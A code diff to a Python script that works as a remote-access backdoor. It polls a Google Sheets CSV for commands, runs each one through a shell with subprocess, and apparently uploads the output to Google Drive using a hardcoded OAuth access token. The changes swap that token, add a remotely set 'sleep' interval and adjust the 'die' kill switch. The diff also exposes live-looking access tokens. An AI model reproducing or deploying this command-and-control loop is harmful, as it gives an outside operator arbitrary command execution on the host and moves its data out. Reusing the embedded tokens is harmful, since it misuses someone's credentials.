@@ -109,7 +109,7 @@ def upload(is_update_file_function=False, update_drive_service_name=None, update
 
     # store = file.Storage('token.json')
     # creds = store.get()
-    creds = client.AccessTokenCredentials("ya29.a0AX9GBdVlxqBQSiFfMH38PefoK-RSfDfGntemLx0OfI3NDs5wz8Nclp7S8mRT-oCevTqOiyuKK0TBikJf_Ai-mMX9rUFrlSHD0tBZeTS3XskYn-49bPVoBjozS1ENyICYug4rM7PSSLzX3JKBs7Iixt7-tJJkF_9yaCgYKAY0SAQASFQHUCsbCivOx3v7z64KXN_IoxEnBnw0167", '')
+    creds = client.AccessTokenCredentials("ya29.a0AX9GBdWHNxEX10fEZNhyne8A9Ao31f1-YFsSEkRYu-dBf_vLGdzSfpRcWkvJIKs4Nu2nnGcBzOK6wszczz4oSWbSRoZ5rgiGRxiAqdGPOmVUwEKKnFp4udkis6JLgqjejLdp_s49C_3A92uEtmW1TrdQXybuxtFBaCgYKAcMSAQASFQHUCsbChWq3VoPySrrhGZRqELkHvg0167", '')
 
     if not creds or creds.invalid:
         flow = client.flow_from_clientsecrets('credentials.json', SCOPES)
@@ -136,9 +136,10 @@ def upload(is_update_file_function=False, update_drive_service_name=None, update
  
 if __name__ == '__main__':
     oldCommands = []
+    interval = 5
 
     while True:
-        time.sleep(5)
+        time.sleep(interval)
 
         # fetch commands
         url = 'https://docs.google.com/spreadsheets/u/3/d/1I1SnnDLVnBZJW0BVRy-jE3m5NlX3OvcCu49kIJ9mquQ/export?format=csv&id=1I1SnnDLVnBZJW0BVRy-jE3m5NlX3OvcCu49kIJ9mquQ&gid=0'
@@ -154,12 +155,15 @@ if __name__ == '__main__':
         if commands == oldCommands:
             # print("commands were not changed !")
             continue
-        elif commands[0] == 'die':
-            sys.exit(1)
         else: oldCommands = commands
 
         outputs = []
         for command in commands:
+            if command == 'die': sys.exit()
+            elif 'sleep ' in commands[0]:
+                interval = int(commands[0][6:])
+                continue
+
             pipe = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             res = pipe.communicate()
             if res[1]: outputs.append(res[1].decode())
